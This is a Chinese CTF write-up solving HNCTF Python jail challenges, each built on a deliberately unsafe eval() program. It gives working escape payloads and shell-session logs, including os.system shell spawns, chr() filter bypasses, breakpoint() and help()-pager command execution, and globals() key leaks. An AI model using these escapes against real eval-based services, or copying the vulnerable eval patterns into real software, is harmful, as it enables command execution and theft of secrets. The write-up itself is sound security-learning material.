# HNCTF Jail---沙盒逃逸-先知社区

> **来源**: https://xz.aliyun.com/news/17269  
> **文章ID**: 17269

---

## HNCTF Jail---沙盒逃逸-题解与分析

> NSSCTF平台的系列题目

### 断点breakponint

`breakpoint()` 是 Python 3.7 引入的一个内置函数，用于在代码中设置断点，方便开发者进行调试。它的作用与传统的调试工具（如 `pdb`）类似，但使用起来更加简洁。

\*\*Python 会启动内置的调试器（默认是 \*\*`pdb`）

**就是我们python用的断点调试**

**调试模式，常用命令：**

* `n` (next): 执行下一行代码。
* `c` (continue): 继续执行，直到下一个断点或程序结束。
* `q` (quit): 退出调试模式并终止程序。
* `p <expression>`: 打印表达式的值。
* `l` (list): 显示当前代码的上下文。
* `s` (step): 进入函数的内部执行。
* `h` (help): 查看帮助信息。

**但是我们进入这个东西之后是可以利用进行命令执行的**

```
 Python 3.11.4 (tags/v3.11.4:d2340ef, Jun  7 2023, 05:45:37) [MSC v.1934 64 bit (AMD64)] on win32
 Type "help", "copyright", "credits" or "license" for more information.
 >>> breakpoint()
 --Return--
 > <stdin>(1)<module>()->None
 (Pdb) __import__("os").system("dir")
  驱动器 E 中的卷是 wen
  卷的序列号是 D67B-E3D1
 
  E:\VS\xxx 的目录
 
 12/10/2025  07:57 PM    <DIR>          .
 ....
               13 个文件        270,494 字节
                3 个目录 88,626,089,984 可用字节
 0
 (Pdb)
```

### calcjailbeginner(JAIL)

**附件内容如下：**

```
 #Your goal is to read ./flag.txt
 #You can use these payload liked `__import__('os').system('cat ./flag.txt')` or `print(open('/flag.txt').read())`
 
 WELCOME = '''
   _     ______      _                              _       _ _ 
  | |   |  ____|    (_)                            | |     (_) |
  | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |
  | '_ \|  __| / _` | | '_ \| '_ \ / _ \ '__|  _   | |/ _` | | |
  | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |
  |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|
                __/ |                                           
               |___/                                            
 '''
 
 print(WELCOME)
 
 print("Welcome to the python jail")
 print("Let's have an beginner jail of calc")
 print("Enter your expression and I will evaluate it for you.")
 input_data = input("> ")
 print('Answer: {}'.format(eval(input_data)))
 
```

**无过滤，目标是拿到flag**

#### Payload

**利用os读取**

```
 __import__('os').system('ls')
 __import__('os').system('cat flag')
```

**直接上sh**

```
 __import__('os').system('sh')
 __import__('os').system('bash')
```

### calcjailbeginnerlevel1(JAIL)

```
 #the function of filter will banned some string ',",i,b
 #it seems banned some payload 
 #Can u escape it?Good luck!
 
 def filter(s):
     not_allowed = set('"\'`ib')
     return any(c in not_allowed for c in s)
 
 WELCOME = '''
   _                _                           _       _ _   _                _ __ 
  | |              (_)                         (_)     (_) | | |              | /_ |
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|
               __/ |                          _/ |                                  
              |___/                          |__/                                                                                      
 '''
 
 print(WELCOME)
 
 print("Welcome to the python jail")
 print("Let's have an beginner jail of calc")
 print("Enter your expression and I will evaluate it for you.")
 input_data = input("> ")
 if filter(input_data):
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
 
```

*banned some string ',",i,b*

**可以利用chr绕过**

**我这里写了一个字符串转** `chr()`的脚本

```
 def str_to_chr_expr(s):
     return " + ".join(f"chr({ord(c)})" for c in s)
 
 # 示例：
 input_str = "flag"
 output = str_to_chr_expr(input_str)
 print(output)  # 输出: chr(102) + chr(108) + chr(97) + chr(103)
```

#### Payload

```
 > open(chr(102) + chr(108) + chr(97) + chr(103)).read()
 Answer: flag=NSSCTF{340e6b5e-bddc-4af2-92a2-d2884d7286e0}
```

### calcjailbeginnerlevel2(JAIL)

> **you finish beginner challenge level1.Let’s play an challenge of level2**
>
> **Now that the length is limited, can u escape this jail?**
>
> **Author:crazyman**

```
 #the length is be limited less than 13
 #it seems banned some payload 
 #Can u escape it?Good luck!
 
 WELCOME = '''
   _                _                           _       _ _   _                _ ___  
  | |              (_)                         (_)     (_) | | |              | |__ \ 
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / / 
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_ 
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
               __/ |                          _/ |                                    
              |___/                          |__/                                                                            
 '''
 
 print(WELCOME)
 
 print("Welcome to the python jail")
 print("Let's have an beginner jail of calc")
 print("Enter your expression and I will evaluate it for you.")
 input_data = input("> ")
 if len(input_data)>13:
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
 
```

**限制了长度**

**我们利用input()**

**利用** `exec()`和 `eval()`

```
 PS E:\gitproject\Script> ncat node5.anna.nssctf.cn 27118
 
   _                _                           _       _ _   _                _ ___
  | |              (_)                         (_)     (_) | | |              | |__ \
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| |  ) |
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ | / /
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |/ /_
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____|
               __/ |                          _/ |
              |___/                          |__/
 
 
 Welcome to the python jail
 Let's have an beginner jail of calc
 Enter your expression and I will evaluate it for you.
 > eval(input())
 __import__('os').system('bash')
 bash: cannot set terminal process group (14): Inappropriate ioctl for device
 bash: no job control in this shell
 ctf@b6bb81439bae43ce:~$ ls
 flag  server.py
 ctf@b6bb81439bae43ce:~$ cat flag
 flag=NSSCTF{4c056559-33ba-4a5e-9b39-b559401895ce}
```

### calcjailbeginnerlevel2.5(JAIL)

> **evel2 seems have some unintend soluntion**
>
> **level2.5 is out.Let’s Avenger**
>
> **Author:crazyman**

```
 #the length is be limited less than 13
 #it seems banned some payload 
 #banned some unintend sol
 #Can u escape it?Good luck!
 
 def filter(s):
     BLACKLIST = ["exec","input","eval"]
     for i in BLACKLIST:
         if i in s:
             print(f'{i!r} has been banned for security reasons')
             exit(0)
 
 WELCOME = '''
   _                _                           _       _ _ _                _ ___    _____ 
  | |              (_)                         (_)     (_) | |              | |__ \  | ____|
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
               __/ |                          _/ |                                          
              |___/                          |__/                                                                                                            
 '''
 
 print(WELCOME)
 
 print("Welcome to the python jail")
 print("Let's have an beginner jail of calc")
 print("Enter your expression and I will evaluate it for you.")
 input_data = input("> ")
 filter(input_data)
 if len(input_data)>13:
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
 
```

**就是说出题人不想我们在上一题使用input()**

**新学到一个点** `breakpoint()`

#### Payload

```
 PS E:\gitproject\Script> ncat node5.anna.nssctf.cn 22162
 
   _                _                           _       _ _ _                _ ___    _____
  | |              (_)                         (_)     (_) | |              | |__ \  | ____|
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/
               __/ |                          _/ |
              |___/                          |__/
 
 
 Welcome to the python jail
 Let's have an beginner jail of calc
 Enter your expression and I will evaluate it for you.
 > breakpoint()
 --Return--
 > <string>(1)<module>()->None
 (Pdb) __import__('os').system('bash')
 bash: cannot set terminal process group (33): Inappropriate ioctl for device
 bash: no job control in this shell
 ctf@8a5e191fa91840f8:~$ cat flag
 flag=NSSCTF{78f3af85-3051-4d6c-8db3-18b82b129479}
```

### calcjailbeginnerlevel3

> **you finish beginner challenge level2.Let’s play an challenge of level3**
>
> **Now that the length is limited than level2, can u escape this jail?**
>
> **Author:crazyman**
>
> **hint:seccon final 2021**

```
 #!/usr/bin/env python3
 WELCOME = '''
   _                _                           _       _ _   _                _ ____  
  | |              (_)                         (_)     (_) | | |              | |___ \ 
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ < 
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/ 
               __/ |                          _/ |                                     
              |___/                          |__/                                                                                       
 '''
 
 print(WELCOME)
 #the length is be limited less than 7
 #it seems banned some payload 
 #Can u escape it?Good luck!
 print("Welcome to the python jail")
 print("Let's have an beginner jail of calc")
 print("Enter your expression and I will evaluate it for you.")
 input_data = input("> ")
 if len(input_data)>7:
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
 
```

**利用** `help()` **进入** `more` **分页模式**

* `help()` 进入 `os` 模块的帮助文档后，会启用分页 (`--More--`)，等待用户继续翻页。
* **关键点**：很多 Python 沙箱的 `more` 分页器允许执行 Shell 命令！

`!` 符号在 `more` 分页模式下 **可以执行系统命令**，从而绕过 Python 沙箱的限制。

**例如：**

#### payload

```
 PS C:\Users\lenovo> ncat node5.anna.nssctf.cn 25535
 
   _                _                           _       _ _   _                _ ____
  | |              (_)                         (_)     (_) | | |              | |___ \
  | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| | __) |
  | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | | |/ _ \ \ / / _ \ ||__ <
  | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ |___) |
  |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_|____/
               __/ |                          _/ |
              |___/                          |__/
 
 
 Welcome to the python jail
 Let's have an beginner jail of calc
 Enter your expression and I will evaluate it for you.
 > help()
 
 Welcome to Python 3.8's help utility!
 
 If this is your first time using Python, you should definitely check out
 the tutorial on the Internet at https://docs.python.org/3.8/tutorial/.
 
 Enter the name of any module, keyword, or topic to get help on writing
 Python programs and using Python modules.  To quit this help utility and
 return to the interpreter, just type "quit".
 
 To get a list of available modules, keywords, symbols, or topics, type
 "modules", "keywords", "symbols", or "topics".  Each module also comes
 with a one-line summary of what it does; to list the modules whose name
 or summary contain a given string such as "spam", type "modules spam".
 
 help> os
 Help on module os:
 
 NAME
     os - OS routines for NT or Posix depending on what system we're on.
 
 MODULE REFERENCE
     https://docs.python.org/3.8/library/os
 
     The following documentation is automatically generated from the Python
     source files.  It may be incomplete, incorrect or include features that
     are considered implementation detail and may vary between Python
     implementations.  When in doubt, consult the module reference at the
     location listed above.
 
 DESCRIPTION
     This exports:
       - all functions from posix or nt, e.g. unlink, stat, etc.
       - os.path is either posixpath or ntpath
       - os.name is either 'posix' or 'nt'
       - os.curdir is a string representing the current directory (always '.')
       - os.pardir is a string representing the parent directory (always '..')
       - os.sep is the (or a most common) pathname separator ('/' or '\')
       - os.extsep is the extension separator (always '.')
 --More--!cat flag
 !cat flag
 flag=NSSCTF{6d24b525-1226-457e-96d0-65f62f687edc}
 ------------------------
 --More--
```

### python2 input(JAIL)

> **Let’s have a rest,Did u like the challenge of python2 but it only have an input function.**
>
> **Can u read the flag**

**直接**

```
 PS C:\Users\lenovo> ncat node5.anna.nssctf.cn 22135
 
               _   _      ___        ___    _____             _    _ _
              | | | |    / _ \      |__ \  |_   _|           | |  | | |
   _ __  _   _| |_| |__ | | | |_ __    ) |   | |  _ __  _ __ | |  | | |_
  | '_ \| | | | __| '_ \| | | | '_ \  / /    | | | '_ \| '_ \| |  | | __|
  | |_) | |_| | |_| | | | |_| | | | |/ /_   _| |_| | | | |_) | |__| | |_
  | .__/ \__, |\__|_| |_|\___/|_| |_|____| |_____|_| |_| .__/ \____/ \__|
  | |     __/ |                                        | |
  |_|    |___/                                         |_|
 
 Welcome to the python jail
 But this program will repeat your messages
 > __builtins__.__import__('os').system('cat flag')
 flag=NSSCTF{20ebf50d-b485-452f-987f-a222d5a697de}
 0
```

### lake lake lake(JAIL)

> **Cool job of u finished level3**
>
> **Now it’s time for level4,Try to leak the key!**

**环境代码如下：**

```
 #it seems have a backdoor
 #can u find the key of it and use the backdoor
 
 fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"
 
 def func():
     code = input(">")
     if(len(code)>9):
         return print("you're hacker!")
     try:
         print(eval(code))
     except:
         pass
 
 def backdoor():
     print("Please enter the admin key")
     key = input(">")
     if(key == fake_key_var_in_the_local_but_real_in_the_remote):
         code = input(">")
         try:
             print(eval(code))
         except:
             pass
     else:
         print("Nooo!!!!")
 
 WELCOME = '''
   _       _          _       _          _       _        
  | |     | |        | |     | |        | |     | |       
  | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
  | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _ \
  | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
  |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                                                     
 '''
 
 print(WELCOME)
 
 print("Now the program has two functions")
 print("can you use dockerdoor")
 print("1.func")
 print("2.backdoor")
 input_data = input("> ")
 if(input_data == "1"):
     func()
     exit(0)
 elif(input_data == "2"):
     backdoor()
     exit(0)
 else:
     print("not found the choice")
     exit(0)
 
```

**只能选择这两个模式，执行代码第一个不能超过9，第二个没有限制，但是我们必须获取到key**

#### Payload

**利用globals()读取全局变量**

```
 PS C:\Users\lenovo> ncat node5.anna.nssctf.cn 29147
 
   _       _          _       _          _       _
  | |     | |        | |     | |        | |     | |
  | | __ _| | _____  | | __ _| | _____  | | __ _| | _____
  | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
  |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                  
 
 
 Now the program has two functions
 can you use dockerdoor
 1.func
 2.backdoor
 > 1
 >globals()
 {'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f01b4bf8a90>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./server.py', '__cached__': None, 'key_9b1d015375213e21': 'a34af94e88aed5c34fb5ccfe08cd14ab', 'func': <function func at 0x7f01b4d97d90>, 'backdoor': <function backdoor at 0x7f01b4c59fc0>, 'WELCOME': '
  _       _          _       _          _       _        
 | |     | |        | |     | |        | |     | |       
 | | __ _| | _____  | | __ _| | _____  | | __ _| | _____ 
 | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
 |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                
                                                      
', 'input_data': '1'}
```

**读取flag**

```
 PS C:\Users\lenovo> ncat node5.anna.nssctf.cn 29147
 
   _       _          _       _          _       _
  | |     | |        | |     | |        | |     | |
  | | __ _| | _____  | | __ _| | _____  | | __ _| | _____
  | |/ _` | |/ / _ \ | |/ _` | |/ / _ \ | |/ _` | |/ / _  | | (_| |   <  __/ | | (_| |   <  __/ | | (_| |   <  __/
  |_|\__,_|_|\_\___| |_|\__,_|_|\_\___| |_|\__,_|_|\_\___|                                                                                                                                  
 
 
 Now the program has two functions
 can you use dockerdoor
 1.func
 2.backdoor
 > 2
 Please enter the admin key
 >a34af94e88aed5c34fb5ccfe08cd14ab
 >__import__('os').system('sh')
 sh: 0: can't access tty; job control turned off
 $ cat flag
 flag=NSSCTF{4406c95e-74af-45f0-89ec-41440e5dd4cd}
 $ 
```

### l@ke l@ke l@ke(JAIL)

> **seems u finished lake lake lake**
>
> **Let’s have a try on l@ke l@ke l@ke**
>
> **G00d luck!!!**

```
 #it seems have a backdoor as `lake lake lake`
 #but it seems be limited!
 #can u find the key of it and use the backdoor
 
 fake_key_var_in_the_local_but_real_in_the_remote = "[DELETED]"
 
 def func():
     code = input(">")
     if(len(code)>6):
         return print("you're hacker!")
     try:
         print(eval(code))
     except:
         pass
 
 def backdoor():
     print("Please enter the admin key")
     key = input(">")
     if(key == fake_key_var_in_the_local_but_real_in_the_remote):
         code = input(">")
         try:
             print(eval(code))
         except:
             pass
     else:
         print("Nooo!!!!")
 
 WELCOME = '''
   _         _          _         _          _         _        
  | |  ____ | |        | |  ____ | |        | |  ____ | |       
  | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____ 
  | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \
  | | | (_| |   <  __/ | | | (_| |   <  __/ | | | (_| |   <  __/
  |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
      \____/               \____/               \____/                                                                                                                                                                                                                                        
 '''
 
 print(WELCOME)
 
 print("Now the program has two functions")
 print("can you use dockerdoor")
 print("1.func")
 print("2.backdoor")
 input_data = input("> ")
 if(input_data == "1"):
     func()
     exit(0)
 elif(input_data == "2"):
     backdoor()
     exit(0)
 else:
     print("not found the choice")
     exit(0)
 
```

**这两题应该是对help()做了手脚**

**限制到6个字符还得请help()**

**输入** `__main__`可以得到当前模块的帮助和信息

**具体如下**

#### payload

```
 PS C:\Users\lenovo> ncat node5.anna.nssctf.cn 27651
 
   _         _          _         _          _         _
  | |  ____ | |        | |  ____ | |        | |  ____ | |
  | | / __ \| | _____  | | / __ \| | _____  | | / __ \| | _____
  | |/ / _` | |/ / _ \ | |/ / _` | |/ / _ \ | |/ / _` | |/ / _  | | | (_| |   <  __/ | | | (_| |   <  __/ | | | (_| |   <  __/
  |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___| |_|\ \__,_|_|\_\___|
      \____/               \____/               \____/                                                                                                                                 
 
 
 Now the program has two functions
 can you use dockerdoor
 1.func
 2.backdoor
 > 1
 >help()   
 
 Welcome to Python 3.10's help utility!
 
 If this is your first time using Python, you should definitely check out
 the tutorial on the internet at https://docs.python.org/3.10/tutorial/.
 
 Enter the name of any module, keyword, or topic to get help on writing
 Python programs and using Python modules.  To quit this help utility and
 return to the interpreter, just type "quit".
 
 To get a list of available modules, keywords, symbols, or topics, type
 "modules", "keywords", "symbols", or "topics".  Each module also comes
 with a one-line summary of what it does; to list the modules whose name
 or summary contain a given string such as "spam", type "modules spam".
 
 help> __main__
 Help on module __main__:
 
 NAME
     __main__
 
 DESCRIPTION
     #it seems have a backdoor as `lake lake lake`
     #but it seems be limited!
     #can u find the key of it and use the backdoor
 
 FUNCTIONS
     backdoor()
 
     func()
 
 DATA
     WELCOME = '
  _         _          _         _          _  ...       ...
     __annotations__ = {}
     input_data = '1'
     key_9d38ee7f31d6126d = '95c720690c2c83f0982ffba63ff87338'
 
 FILE
     /home/ctf/server.py
 --More--
```

### 参考文章

\*\*: \*\*<https://zhuanlan.zhihu.com/p/578986988>

\*\*: \*\*[https://scofield.top/hnctfpyjail/](https://scofield.top/hnctf_pyjail/)
